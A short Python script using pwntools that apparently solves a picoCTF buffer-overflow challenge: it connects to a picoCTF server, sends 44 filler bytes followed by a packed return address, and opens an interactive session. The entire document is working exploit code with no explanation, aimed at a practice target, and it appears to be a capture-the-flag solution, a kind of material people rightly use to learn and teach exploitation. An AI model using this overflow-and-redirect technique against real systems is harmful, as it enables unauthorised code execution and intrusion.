from pwn import *

p = remote('saturn.picoctf.net', 51045)
context.arch = "amd64"
p.recvuntil(b': ')
offset = b'A' * (44)
address = 0x80491f6
print(f'{hex(address)}')
payload = p64(address)
p.sendline(offset + payload)
p.interactive()
